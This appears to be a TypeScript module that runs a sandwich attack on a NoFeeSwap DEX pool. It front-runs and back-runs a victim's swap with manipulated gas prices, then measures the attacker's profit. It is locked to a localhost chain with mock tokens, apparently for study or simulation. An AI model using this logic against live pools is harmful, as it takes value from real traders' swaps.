import { ethers } from "ethers";
import { DEPLOYMENT, NOFEESWAP_ABI } from "./config";
import type { AttackExecutionResult, DecodedSwap, SwapAnalysis } from "./types";

const X59 = 2n ** 59n;
const X63 = 2n ** 63n;

const PUSH32 = 3;
const NEG = 4;
const LT = 13;
const ISZERO = 16;
const JUMPDEST = 20;
const JUMP = 21;
const TRANSFER_FROM_PAYER_ERC20 = 37;
const TAKE_TOKEN = 42;
const SYNC_TOKEN = 45;
const SETTLE = 47;
const SWAP = 52;
const REVERT = 59;

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)"
] as const;

const NOFEESWAP_EXEC_ABI = [
  ...NOFEESWAP_ABI,
  "function setOperator(address spender, bool approved) returns (bool)",
  "function isOperator(address owner, address spender) view returns (bool)"
] as const;

type ExecConfig = {
  enabled: boolean;
  attackerIndex: number;
  attackFractionBps: number;
  minNetPnl: number;
  mineAfterSubmit: boolean;
};

let preparedAttackerAddress: string | null = null;

function parseEnvNumber(name: string, fallback: number): number {
  const raw = process.env[name];
  if (!raw) return fallback;
  const parsed = Number(raw);
  return Number.isFinite(parsed) ? parsed : fallback;
}

export function getExecConfig(): ExecConfig {
  return {
    enabled: String(process.env.EXECUTE_LOCAL_ATTACK ?? "false").toLowerCase() === "true",
    attackerIndex: Math.max(2, Math.floor(parseEnvNumber("ATTACKER_INDEX", 2))),
    attackFractionBps: Math.min(9000, Math.max(100, Math.floor(parseEnvNumber("ATTACK_FRACTION_BPS", 3000)))),
    minNetPnl: parseEnvNumber("MIN_NET_PNL_TOKENOUT", 0),
    mineAfterSubmit: String(process.env.MINE_AFTER_ATTACK ?? "true").toLowerCase() === "true"
  };
}

function assertLocalExecutionOnly() {
  const host = new URL(DEPLOYMENT.rpcUrl).hostname;
  if (!(host === "127.0.0.1" || host === "localhost")) {
    throw new Error(`Execution mode is locked to localhost RPC. Found host: ${host}`);
  }
}

function priceToOffsetted(price: number): bigint {
  return BigInt(Math.floor(Number(X59) * Math.log(price))) + X63;
}

function pack(types: ReadonlyArray<string>, values: ReadonlyArray<unknown>): string {
  return ethers.solidityPacked(types, values);
}

function byteLength(sequence: ReadonlyArray<string>): number {
  return sequence.reduce((total, item) => total + ethers.dataLength(item), 0);
}

function buildSwapSequence(params: {
  nofeeswap: string;
  token0: string;
  token1: string;
  recipient: string;
  poolId: bigint;
  amountSpecified: bigint;
  limitPrice: number;
  zeroForOne: number;
  deadline: number;
}): string {
  const {
    nofeeswap,
    token0,
    token1,
    recipient,
    poolId,
    amountSpecified,
    limitPrice,
    zeroForOne,
    deadline
  } = params;

  const successSlot = 2;
  const amount0Slot = 3;
  const amount1Slot = 4;
  const successSlotTransfer0 = 7;
  const successSlotTransfer1 = 8;
  const valueSlotSettle0 = 9;
  const successSlotSettle0 = 10;
  const resultSlotSettle0 = 11;
  const valueSlotSettle1 = 12;
  const successSlotSettle1 = 13;
  const resultSlotSettle1 = 14;
  const amountSpecifiedSlot = 15;
  const zeroSlot = 100;
  const logicSlot = 200;
  let limitOffsetted = priceToOffsetted(limitPrice);
  if (limitOffsetted < 0n) limitOffsetted = 0n;
  if (limitOffsetted >= 2n ** 64n) limitOffsetted = (2n ** 64n) - 1n;

  const sequence = new Array(27).fill("0x");
  sequence[0] = pack(["uint8", "int256", "uint8"], [PUSH32, amountSpecified, amountSpecifiedSlot]);
  sequence[1] = pack(
    ["uint8", "uint256", "uint8", "uint64", "uint8", "uint8", "uint8", "uint8", "uint8", "uint16", "bytes"],
    [SWAP, poolId, amountSpecifiedSlot, limitOffsetted, zeroForOne, zeroSlot, successSlot, amount0Slot, amount1Slot, 0, "0x"]
  );
  sequence[2] = pack(["uint8", "uint16", "uint8"], [0, 0, 0]);
  sequence[3] = pack(["uint8"], [REVERT]);
  sequence[4] = pack(["uint8"], [JUMPDEST]);
  sequence[2] = pack(["uint8", "uint16", "uint8"], [JUMP, byteLength(sequence.slice(0, 4)), successSlot]);
  sequence[5] = pack(["uint8", "uint8", "uint8", "uint8"], [LT, zeroSlot, amount0Slot, logicSlot]);
  sequence[6] = pack(["uint8", "uint16", "uint8"], [0, 0, 0]);
  sequence[7] = pack(["uint8", "uint8", "uint8"], [NEG, amount0Slot, amount0Slot]);
  sequence[8] = pack(["uint8", "address", "address", "uint8", "uint8"], [TAKE_TOKEN, token0, recipient, amount0Slot, successSlotSettle0]);
  sequence[9] = pack(["uint8"], [JUMPDEST]);
  sequence[6] = pack(["uint8", "uint16", "uint8"], [JUMP, byteLength(sequence.slice(0, 9)), logicSlot]);
  sequence[10] = pack(["uint8", "uint8", "uint8"], [ISZERO, logicSlot, logicSlot]);
  sequence[11] = pack(["uint8", "uint16", "uint8"], [0, 0, 0]);
  sequence[12] = pack(["uint8", "address"], [SYNC_TOKEN, token0]);
  sequence[13] = pack(
    ["uint8", "address", "uint8", "address", "uint8", "uint8"],
    [TRANSFER_FROM_PAYER_ERC20, token0, amount0Slot, nofeeswap, successSlotTransfer0, 0]
  );
  sequence[14] = pack(["uint8", "uint8", "uint8", "uint8"], [SETTLE, valueSlotSettle0, successSlotSettle0, resultSlotSettle0]);
  sequence[15] = pack(["uint8"], [JUMPDEST]);
  sequence[11] = pack(["uint8", "uint16", "uint8"], [JUMP, byteLength(sequence.slice(0, 15)), logicSlot]);
  sequence[16] = pack(["uint8", "uint8", "uint8", "uint8"], [LT, zeroSlot, amount1Slot, logicSlot]);
  sequence[17] = pack(["uint8", "uint16", "uint8"], [0, 0, 0]);
  sequence[18] = pack(["uint8", "uint8", "uint8"], [NEG, amount1Slot, amount1Slot]);
  sequence[19] = pack(["uint8", "address", "address", "uint8", "uint8"], [TAKE_TOKEN, token1, recipient, amount1Slot, successSlotSettle1]);
  sequence[20] = pack(["uint8"], [JUMPDEST]);
  sequence[17] = pack(["uint8", "uint16", "uint8"], [JUMP, byteLength(sequence.slice(0, 20)), logicSlot]);
  sequence[21] = pack(["uint8", "uint8", "uint8"], [ISZERO, logicSlot, logicSlot]);
  sequence[22] = pack(["uint8", "uint16", "uint8"], [0, 0, 0]);
  sequence[23] = pack(["uint8", "address"], [SYNC_TOKEN, token1]);
  sequence[24] = pack(
    ["uint8", "address", "uint8", "address", "uint8", "uint8"],
    [TRANSFER_FROM_PAYER_ERC20, token1, amount1Slot, nofeeswap, successSlotTransfer1, 0]
  );
  sequence[25] = pack(["uint8", "uint8", "uint8", "uint8"], [SETTLE, valueSlotSettle1, successSlotSettle1, resultSlotSettle1]);
  sequence[26] = pack(["uint8"], [JUMPDEST]);
  sequence[22] = pack(["uint8", "uint16", "uint8"], [JUMP, byteLength(sequence.slice(0, 26)), logicSlot]);

  return pack(["uint32", ...new Array(sequence.length).fill("bytes")], [deadline, ...sequence]);
}

async function prepareAttacker(
  provider: ethers.JsonRpcProvider,
  attackerIndex: number
): Promise<{ attacker: ethers.JsonRpcSigner; attackerAddress: string }> {
  const attacker = await provider.getSigner(attackerIndex);
  const attackerAddress = await attacker.getAddress();
  if (preparedAttackerAddress === attackerAddress) {
    return { attacker, attackerAddress };
  }

  const owner = await provider.getSigner(1);
  const nofeeswap = new ethers.Contract(DEPLOYMENT.contracts.nofeeswap, NOFEESWAP_EXEC_ABI, attacker);
  const token0 = new ethers.Contract(DEPLOYMENT.mockTokens.token0, ERC20_ABI, owner);
  const token1 = new ethers.Contract(DEPLOYMENT.mockTokens.token1, ERC20_ABI, owner);
  const floatAmount = ethers.parseUnits("100000", 18);

  const [bal0, bal1, op] = await Promise.all([
    token0.balanceOf(attackerAddress),
    token1.balanceOf(attackerAddress),
    nofeeswap.isOperator(attackerAddress, DEPLOYMENT.contracts.operator)
  ]);

  if (bal0 < floatAmount / 10n) await (await token0.transfer(attackerAddress, floatAmount)).wait();
  if (bal1 < floatAmount / 10n) await (await token1.transfer(attackerAddress, floatAmount)).wait();
  if (!op) await (await nofeeswap.setOperator(DEPLOYMENT.contracts.operator, true)).wait();

  const attackerToken0 = token0.connect(attacker) as ethers.Contract;
  const attackerToken1 = token1.connect(attacker) as ethers.Contract;
  const [allow0, allow1] = await Promise.all([
    attackerToken0.allowance(attackerAddress, DEPLOYMENT.contracts.operator),
    attackerToken1.allowance(attackerAddress, DEPLOYMENT.contracts.operator)
  ]);

  if (allow0 < floatAmount / 10n) await (await attackerToken0.approve(DEPLOYMENT.contracts.operator, ethers.MaxUint256)).wait();
  if (allow1 < floatAmount / 10n) await (await attackerToken1.approve(DEPLOYMENT.contracts.operator, ethers.MaxUint256)).wait();

  preparedAttackerAddress = attackerAddress;
  return { attacker, attackerAddress };
}

export async function tryExecuteLocalSandwich(params: {
  provider: ethers.JsonRpcProvider;
  decoded: DecodedSwap;
  report: SwapAnalysis;
  config: ExecConfig;
}): Promise<AttackExecutionResult> {
  const { provider, decoded, report, config } = params;
  if (!config.enabled) return { executed: false, skippedReason: "execution-disabled" };
  if (!report.profitable || report.estimatedNetPnlTokenOut < config.minNetPnl) {
    return { executed: false, skippedReason: "not-profitable" };
  }

  const samplePoolId = BigInt(DEPLOYMENT.samplePool.poolId);
  if (decoded.poolId !== samplePoolId) {
    return { executed: false, skippedReason: "non-sample-pool" };
  }

  assertLocalExecutionOnly();
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== DEPLOYMENT.chainId) {
    return { executed: false, skippedReason: `chain-mismatch-${chainId}` };
  }

  const { attacker, attackerAddress } = await prepareAttacker(provider, config.attackerIndex);
  const victimAmount = decoded.amountSpecified < 0n ? -decoded.amountSpecified : decoded.amountSpecified;
  const attackAmount = (victimAmount * BigInt(config.attackFractionBps)) / 10_000n;
  if (attackAmount <= 0n) {
    return { executed: false, skippedReason: "tiny-amount" };
  }

  const nofeeswap = new ethers.Contract(DEPLOYMENT.contracts.nofeeswap, NOFEESWAP_EXEC_ABI, attacker);
  const token0 = DEPLOYMENT.mockTokens.token0;
  const token1 = DEPLOYMENT.mockTokens.token1;
  const frontDirection = decoded.zeroForOne <= 1 ? decoded.zeroForOne : 0;
  const backDirection = frontDirection === 0 ? 1 : 0;
  const frontLimitPrice = frontDirection === 0 ? report.currentPrice * 1.25 : report.currentPrice * 0.75;
  const backLimitPrice = backDirection === 0 ? report.currentPrice * 1.25 : report.currentPrice * 0.75;
  const deadline = Math.floor(Date.now() / 1000) + 1200;
  const frontrunSequence = buildSwapSequence({
    nofeeswap: DEPLOYMENT.contracts.nofeeswap,
    token0,
    token1,
    recipient: attackerAddress,
    poolId: decoded.poolId,
    amountSpecified: attackAmount,
    limitPrice: frontLimitPrice,
    zeroForOne: frontDirection,
    deadline
  });
  const backrunSequence = buildSwapSequence({
    nofeeswap: DEPLOYMENT.contracts.nofeeswap,
    token0,
    token1,
    recipient: attackerAddress,
    poolId: decoded.poolId,
    amountSpecified: attackAmount,
    limitPrice: backLimitPrice,
    zeroForOne: backDirection,
    deadline
  });

  const token0Contract = new ethers.Contract(token0, ERC20_ABI, provider);
  const token1Contract = new ethers.Contract(token1, ERC20_ABI, provider);
  const [before0, before1] = await Promise.all([
    token0Contract.balanceOf(attackerAddress),
    token1Contract.balanceOf(attackerAddress)
  ]);

  const feeData = await provider.getFeeData();
  const victimGasPrice = decoded.gasPriceGwei
    ? ethers.parseUnits(decoded.gasPriceGwei, "gwei")
    : (feeData.gasPrice ?? ethers.parseUnits("1", "gwei"));
  const frontrunGasPrice = victimGasPrice + ethers.parseUnits("2", "gwei");
  const backrunGasPrice = victimGasPrice > ethers.parseUnits("1", "gwei")
    ? victimGasPrice - ethers.parseUnits("1", "gwei")
    : ethers.parseUnits("1", "gwei");

  const nextNonce = await provider.getTransactionCount(attackerAddress, "pending");
  const frontrun = await nofeeswap.unlock(DEPLOYMENT.contracts.operator, frontrunSequence, {
    nonce: nextNonce,
    gasPrice: frontrunGasPrice,
    gasLimit: 900_000
  });

  const backrun = await nofeeswap.unlock(DEPLOYMENT.contracts.operator, backrunSequence, {
    nonce: nextNonce + 1,
    gasPrice: backrunGasPrice,
    gasLimit: 900_000
  });

  if (config.mineAfterSubmit) {
    await provider.send("evm_mine", []);
  }

  const [frontReceipt, backReceipt, victimTx] = await Promise.all([
    frontrun.wait(),
    backrun.wait(),
    provider.getTransaction(decoded.hash)
  ]);
  const victimReceipt = victimTx ? await victimTx.wait() : null;

  let orderVerified = false;
  if (
    victimReceipt &&
    victimReceipt.blockNumber === frontReceipt.blockNumber &&
    victimReceipt.blockNumber === backReceipt.blockNumber
  ) {
    const block = await provider.send("eth_getBlockByNumber", [
      ethers.toQuantity(frontReceipt.blockNumber),
      true
    ]) as { transactions?: Array<{ hash?: string }> };
    if (block?.transactions && block.transactions.length > 0) {
      const hashes = block.transactions.map((entry) => entry.hash ?? "");
      const iFront = hashes.indexOf(frontrun.hash);
      const iVictim = hashes.indexOf(decoded.hash);
      const iBack = hashes.indexOf(backrun.hash);
      orderVerified = iFront >= 0 && iVictim >= 0 && iBack >= 0 && iFront < iVictim && iVictim < iBack;
    }
  }

  const [after0, after1] = await Promise.all([
    token0Contract.balanceOf(attackerAddress),
    token1Contract.balanceOf(attackerAddress)
  ]);

  return {
    executed: true,
    frontrunHash: frontrun.hash,
    backrunHash: backrun.hash,
    victimHash: decoded.hash,
    frontrunBlock: frontReceipt.blockNumber,
    victimBlock: victimReceipt?.blockNumber,
    backrunBlock: backReceipt.blockNumber,
    orderVerified,
    attackerDeltaToken0: (after0 - before0).toString(),
    attackerDeltaToken1: (after1 - before1).toString()
  };
}
